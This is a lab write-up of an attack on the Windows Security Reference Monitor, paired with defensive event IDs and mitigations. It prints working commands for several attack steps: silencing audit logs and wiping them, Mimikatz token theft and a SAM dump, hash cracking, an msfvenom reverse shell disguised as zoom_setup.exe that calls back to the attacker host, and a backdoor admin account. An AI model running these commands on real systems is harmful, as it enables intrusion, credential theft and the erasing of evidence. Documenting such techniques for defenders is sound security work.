# 🔬 Lab 01 — Windows Security Reference Monitor (SRM) Analysis

> **"The SRM doesn't know good from evil. It only knows: does this token have permission?"**

A full offensive + defensive analysis of the Windows Security Reference Monitor — covering access control enforcement, audit evasion, token impersonation, credential harvesting, and persistence. Conducted in an isolated lab environment (Windows 7 + Kali Linux).

---

## 📋 Table of Contents

- [Objective](#objective)
- [Environment](#environment)
- [Key Concept: What is the SRM?](#key-concept-what-is-the-srm)
- [Attack Chain Overview](#attack-chain-overview)
- [Phase Breakdown](#phase-breakdown)
- [Key Findings](#key-findings)
- [Defensive Takeaways](#defensive-takeaways)
- [Tools Used](#tools-used)
- [Lessons Learned](#lessons-learned)

---

## Objective

Prove that the Windows Security Reference Monitor operates as a **"Trusting Guard"** — it enforces access based purely on token identity, not intent. An attacker who steals a valid admin token is, from the SRM's perspective, a legitimate user.

The lab walks through a complete attack lifecycle:
**Baseline → Blind the logs → Infiltrate → Hijack identity → Loot credentials → Establish persistence → Erase tracks**

---

## Environment

| Component | Details |
|---|---|
| Victim Machine | Windows 7 x64 (`192.168.254.131`) |
| Attacker Machine | Kali Linux (`192.168.254.128`) |
| Network | Isolated local subnet (VMware/VirtualBox) |
| Key Tools | Mimikatz, Metasploit (msfvenom), John the Ripper, auditpol, wevtutil, smbclient |

---

## Key Concept: What is the SRM?

The **Security Reference Monitor** is a kernel-level component in Windows responsible for **access control enforcement**. Every time a process tries to access a file, registry key, or system object, the SRM checks:

```
Subject (who are you?) → Token (your identity/permissions)
       ↓
Object (what do you want?) → Security Descriptor / ACL
       ↓
Decision: ALLOW or DENY
```

**The critical weakness:** The SRM trusts the **token**, not the person holding it. Steal a token → inherit all its permissions — the SRM never knows the difference.

---

## Attack Chain Overview

```
[1] Baseline Setup          →  Created SRM_Test share, configured SACL auditing
[2] Telemetry Verification  →  Confirmed Event ID 4663 (object access) logging
[3] Audit Evasion           →  Disabled file system auditing via auditpol
[4] Log-Clear Paradox       →  Wiped logs with wevtutil — SRM still fired Event 1102
[5] Null Session Test       →  Confirmed SRM blocks unauthenticated SMB access
[6] Tool Staging            →  Hosted Mimikatz via Python HTTP server (web delivery)
[7] Token Impersonation     →  Stole admin token using Mimikatz (privilege::debug → token::elevation)
[8] Credential Harvesting   →  Dumped SAM database → cracked NTLM hash → plaintext: Liverpool
[9] Reverse Shell           →  Generated zoom_setup.exe payload via msfvenom
[10] C2 Established         →  Metasploit multi/handler received callback on port 4444
[11] Persistence            →  Created backdoor admin account (net user hacker /add)
[12] Final Anti-Forensics   →  Cleared security log — Event 1102 still generated
```

---

## Phase Breakdown

### Phase 1–2 | Environment Setup & Auditing
Created a network share (`C:\SRM_Test`) with Full Control for Everyone — intentionally insecure to observe the SRM's DAC enforcement. Configured a SACL on the C: drive to capture **Event ID 4663** (object access attempts).

**Key insight:** Windows auditing is *off by default* to reduce performance overhead. An attacker operating on an unmonitored system leaves no forensic trail.

---

### Phase 3 | Baseline Telemetry Verification
Confirmed via Event Viewer (`eventvwr.msc`) that the SRM was actively logging all file interactions — establishing the forensic baseline before attempting any evasion.

---

### Phase 4–5 | Unauthorized Access Test + Forensic Correlation
Attempted null-session SMB access from Kali:
```bash
smbclient //192.168.254.131/C$ -N
# Result: NT_STATUS_ACCESS_DENIED
```
The SRM enforced **Complete Mediation** — finding no valid ACE for an anonymous user, it blocked the request. Event ID **4625** (failed logon) and **4663** (object access) both logged the attempt.

---

### Phase 6 | Disabling Telemetry (Defense Evasion)
```cmd
auditpol /set /subcategory:"File System" /success:disable
```
The SRM's enforcement continues — but it stops *reporting*. Future file access, payload execution, and data theft no longer generate Event 4663.

**However:** The SRM immediately fired **Event ID 4719/4907** (Audit Policy Change) — proving it protects its own configuration and cannot be silently disabled.

---

### Phase 7–8 | The Log-Clear Paradox
```cmd
wevtutil cl Security
```
The Security Log was wiped — but the SRM generated **Event ID 1102** as its final entry, identifying the user who performed the wipe.

> In a SOC environment, a Security Log containing *only* Event 1102 is an immediate high-priority alert. The absence of logs is itself evidence of compromise.

---

### Phase 9–11 | Token Impersonation (The Core Attack)
Hosted Mimikatz via Python HTTP server, delivered to victim via browser. Then:
```
privilege::debug     → Obtained SeDebugPrivilege (interact with LSASS)
token::list          → Enumerated all active access tokens in memory
token::elevation     → Impersonated administrator token (ID: 764685)
token::whoami        → Confirmed identity hijack
```

**SRM's perspective after this:** Every subsequent action appears to originate from a legitimate, high-privilege administrator. The "bouncer" is now holding the door open.

---

### Phase 12–13 | Credential Harvesting (SAM Dump)
```
lsadump::sam
```
Operating under the hijacked admin token, Mimikatz dumped the SAM database — normally protected by the SRM itself. The NTLM hashes were transferred to Kali and cracked offline:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Cracked: Liverpool
```

---

### Phase 14–18 | Reverse Shell & C2
Generated a masqueraded payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.254.128 LPORT=4444 -f exe > zoom_setup.exe
```
Hosted via Python server → victim downloaded and executed → Metasploit `multi/handler` received the callback → full remote shell established.

**SRM logic here:** The user had permission to download and execute files. The SRM allows it. It has no concept of intent — only permission.

Verified with `netstat -ano`: active ESTABLISHED connection on port 4444 with PID 2092 (the malicious process).

---

### Phase 19–20 | Persistence & Final Cleanup
```cmd
net user hacker Password123 /add
net localgroup administrators hacker /add
wevtutil cl Security
```
Created a permanent backdoor admin account. The SRM logged Events **4720** (account created) and **4732** (added to Administrators group) — then the log was wiped, leaving only Event **1102**.

---

## Key Findings

| Finding | Impact | Evidence |
|---|---|---|
| Token impersonation fully bypasses SRM access control | Critical | Admin token cloned via Mimikatz, SAM dumped with no resistance |
| Audit logging can be silenced, but not without leaving a trace | High | Event 4907 generated on auditpol change; Event 1102 on log clear |
| Reverse shell bypasses inbound firewall rules via outbound connection | High | ESTABLISHED session on port 4444 via netstat |
| Weak password (`Liverpool`) cracked from NTLM hash in seconds | High | John the Ripper + rockyou.txt |
| SRM is passive — it observes and enforces, but cannot intervene without active monitoring | Medium | All events logged, but no automated response triggered |

---

## Defensive Takeaways

**For Blue Team / SOC analysts — the event IDs that matter:**

| Event ID | Meaning | Severity |
|---|---|---|
| 4663 | Object access attempt | Medium (baseline) |
| 4625 | Failed logon | Medium |
| 4907 | Audit policy changed | **HIGH** — near-certain attacker activity |
| 4719 | System audit policy change | **HIGH** |
| 1102 | Security log cleared | **CRITICAL** — immediate investigation required |
| 4720 | New user account created | High |
| 4732 | User added to Administrators group | **HIGH** |

**Mitigations:**
- Forward logs to a remote SIEM *in real-time* — a local log that can be wiped is not a real audit trail
- Enforce strong password policies to prevent NTLM crack from SAM dump
- Restrict `SeDebugPrivilege` — only SYSTEM should have it, never standard users
- Implement application whitelisting to prevent Mimikatz execution
- Alert on `auditpol` changes and `wevtutil cl` commands in your EDR

---

## Tools Used

| Tool | Purpose |
|---|---|
| `Mimikatz` | Token enumeration, impersonation, SAM dump |
| `msfvenom` | Reverse shell payload generation |
| `Metasploit multi/handler` | C2 listener |
| `John the Ripper` | NTLM hash cracking |
| `auditpol` | Audit policy manipulation |
| `wevtutil` | Event log management / clearing |
| `smbclient` | SMB access testing |
| `python3 -m http.server` | Payload hosting / web delivery |

---

## Lessons Learned

1. **The SRM is only as strong as the identity it trusts.** Token-based security means credential protection is the real perimeter — not kernel enforcement.

2. **Absolute stealth is impossible on Windows.** The SRM will always fire a final event when its configuration changes. A smart defender monitors for *absence* of logs, not just presence.

3. **Outbound connections bypass most firewalls.** Reverse shells are effective precisely because firewalls are typically configured to block inbound traffic, not outbound.

4. **OpSec matters even in labs.** Staging payloads in a cluttered directory is a real-world red flag — isolate your workspace.

5. **Weak passwords make kernel-level security irrelevant.** A cracked NTLM hash renders all of Windows' access control meaningless.

---

*Lab conducted in an isolated, controlled environment for educational purposes. All techniques documented here are for defensive understanding and authorized security research only.*
